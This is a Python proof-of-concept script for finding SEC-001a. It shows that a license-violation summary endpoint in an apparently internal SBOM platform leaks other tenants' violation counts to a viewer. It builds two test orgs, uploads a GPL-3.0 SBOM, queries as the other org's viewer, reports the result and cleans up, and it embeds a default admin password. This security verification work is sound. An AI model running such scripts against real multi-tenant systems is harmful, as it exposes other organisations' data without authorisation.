"""
PoC for SEC-001a — DO NOT RUN against production.
============================================================
Demonstrates that GET /api/licenses/violations/summary returns
PLATFORM-WIDE license violation counts to any authenticated viewer,
violating multi-tenant isolation.

Setup:
  1. As admin, create orgA + viewerA, orgB + viewerB
  2. As admin, upload to orgA's release: a CycloneDX SBOM with one
     GPL-3.0 component (which licenses.py treats as a violation)
  3. orgB has zero components / zero violations
  4. Log in as viewerB (zero-violations org)
  5. Hit GET /api/licenses/violations/summary
  6. If response shows GPL-3.0 count > 0 → cross-tenant LEAK
     (because viewerB's org has zero components, the only source
      of GPL-3.0 in the response is orgA's release)

Cleanup: deletes both test orgs at the end.
"""
from __future__ import annotations

import io
import json
import os
import sys
import time
import urllib.error
import urllib.request

API     = os.environ.get("POC_API_URL",        "http://localhost:9100")
ADMIN_U = os.environ.get("POC_ADMIN_USERNAME", "admin")
ADMIN_P = os.environ.get("POC_ADMIN_PASSWORD", "sbom@2024")

STAMP = int(time.time())
ORGA_NAME    = f"POC-001a-OrgA-{STAMP}"
ORGB_NAME    = f"POC-001a-OrgB-{STAMP}"
VIEWERA      = f"poc-vA-{STAMP}"
VIEWERB      = f"poc-vB-{STAMP}"
PASSWORD     = "PocViewer2026!"

# Minimal CycloneDX 1.4 JSON with one GPL-3.0 component.
SBOM = {
    "bomFormat":   "CycloneDX",
    "specVersion": "1.4",
    "version":     1,
    "components": [
        {
            "type":     "library",
            "name":     f"poc-gpl-{STAMP}",
            "version":  "1.0.0",
            "purl":     f"pkg:generic/poc-gpl-{STAMP}@1.0.0",
            "licenses": [{"license": {"id": "GPL-3.0"}}],
        }
    ],
}


def _req(path, method="GET", body=None, token=None):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(f"{API}{path}", data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, (json.loads(resp.read() or b"null"))
    except urllib.error.HTTPError as e:
        body_text = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(body_text)
        except Exception:
            return e.code, body_text


def _upload_sbom(release_id, token):
    """multipart/form-data upload of SBOM."""
    boundary = f"----PocBoundary{STAMP}"
    sbom_bytes = json.dumps(SBOM).encode()
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="poc.cdx.json"\r\n'
        f"Content-Type: application/json\r\n\r\n"
    ).encode() + sbom_bytes + f"\r\n--{boundary}--\r\n".encode()
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    req = urllib.request.Request(
        f"{API}/api/releases/{release_id}/sbom", data=body, headers=headers, method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(text)
        except Exception:
            return e.code, text


def main():
    print(f"PoC SEC-001a - multi-tenant leak in /api/licenses/violations/summary")
    print(f"API: {API}")
    print(f"Test orgs: {ORGA_NAME} (with GPL-3.0 SBOM), {ORGB_NAME} (zero data)")
    print()

    cleanup_org_ids = []
    try:
        # 1. admin login
        code, body = _req("/api/auth/login", "POST", {"username": ADMIN_U, "password": ADMIN_P})
        assert code == 200, f"admin login: {code} {body}"
        admin_tok = body["access_token"]
        print("[1] admin login OK")

        # 2. create orgA + viewerA
        code, body = _req("/api/organizations", "POST",
                          {"name": ORGA_NAME, "username": VIEWERA, "password": PASSWORD},
                          token=admin_tok)
        assert code in (200, 201), f"orgA create: {code} {body}"
        orgA_id = body["id"]
        cleanup_org_ids.append(orgA_id)
        print(f"[2a] orgA created (id={orgA_id})")

        # 2b. create orgB + viewerB
        code, body = _req("/api/organizations", "POST",
                          {"name": ORGB_NAME, "username": VIEWERB, "password": PASSWORD},
                          token=admin_tok)
        assert code in (200, 201), f"orgB create: {code} {body}"
        orgB_id = body["id"]
        cleanup_org_ids.append(orgB_id)
        print(f"[2b] orgB created (id={orgB_id})")

        # 3. as admin: create product + release in orgA
        code, body = _req(f"/api/organizations/{orgA_id}/products", "POST",
                          {"name": "poc-prod", "description": "PoC SEC-001a"},
                          token=admin_tok)
        assert code in (200, 201), f"product create: {code} {body}"
        prodA_id = body["id"]
        print(f"[3a] product created in orgA (id={prodA_id})")

        code, body = _req(f"/api/products/{prodA_id}/releases", "POST",
                          {"version": "1.0.0-poc", "notes": "PoC SEC-001a"},
                          token=admin_tok)
        assert code in (200, 201), f"release create: {code} {body}"
        relA_id = body["id"]
        print(f"[3b] release v1.0.0-poc created (id={relA_id})")

        # 4. upload SBOM with GPL-3.0 component
        code, body = _upload_sbom(relA_id, admin_tok)
        assert code in (200, 201), f"SBOM upload: {code} {body}"
        print(f"[4] SBOM with 1x GPL-3.0 component uploaded to orgA's release")

        # 5. as admin: confirm summary shows the GPL component (sanity)
        code, body = _req("/api/licenses/violations/summary", token=admin_tok)
        assert code == 200, f"admin summary: {code} {body}"
        admin_total = body.get("total_violations", 0)
        admin_gpl = next((r["violation_count"] for r in body.get("by_rule", [])
                          if r["license_id"] == "GPL-3.0"), 0)
        print(f"[5] admin sees total={admin_total}, GPL-3.0 count={admin_gpl}")

        # 6. login as viewerB (zero-data org)
        code, body = _req("/api/auth/login", "POST", {"username": VIEWERB, "password": PASSWORD})
        assert code == 200, f"viewerB login: {code} {body}"
        viewerB_tok = body["access_token"]
        print("[6] viewerB (zero-data org) logged in")

        # 7. confirm viewerB's own org has zero products (sanity)
        code, body = _req(f"/api/organizations/{orgB_id}/products", token=viewerB_tok)
        own_count = len(body) if isinstance(body, list) else 0
        print(f"[7] viewerB's own org has {own_count} products (expect 0)")

        # 8. THE EXPLOIT
        code, body = _req("/api/licenses/violations/summary", token=viewerB_tok)
        assert code == 200, f"viewer summary: {code} {body}"
        viewer_total = body.get("total_violations", 0)
        viewer_gpl = next((r["violation_count"] for r in body.get("by_rule", [])
                           if r["license_id"] == "GPL-3.0"), 0)
        print(f"[8] viewerB (zero own data!) sees total={viewer_total}, GPL-3.0 count={viewer_gpl}")
        print()

        # 9. verdict
        if viewer_gpl > 0:
            print("=" * 70)
            print(f"[LEAK CONFIRMED] viewerB sees {viewer_gpl}x GPL-3.0 violation(s)")
            print(f"  but viewerB's org has 0 components — these are orgA's data")
            print(f"  cross-tenant license-violation disclosure proven")
            print("=" * 70)
            verdict = "LEAK"
        else:
            print("=" * 70)
            print("[NO LEAK] viewerB sees 0 GPL violations — endpoint scoped correctly")
            print("=" * 70)
            verdict = "NO_LEAK"

        return 1 if verdict == "LEAK" else 0

    finally:
        # 10. cleanup
        print()
        if cleanup_org_ids:
            try:
                code, body = _req("/api/auth/login", "POST",
                                  {"username": ADMIN_U, "password": ADMIN_P})
                if code == 200:
                    cleanup_tok = body["access_token"]
                    for org_id in cleanup_org_ids:
                        c, b = _req(f"/api/organizations/{org_id}", "DELETE", token=cleanup_tok)
                        if c == 204:
                            print(f"[cleanup] deleted org {org_id}")
                        else:
                            print(f"[cleanup] WARN: org {org_id} delete returned {c}: {b}")
            except Exception as e:
                print(f"[cleanup] FAIL: {e}")
                print(f"  manual cleanup needed for: {cleanup_org_ids}")


if __name__ == "__main__":
    sys.exit(main())
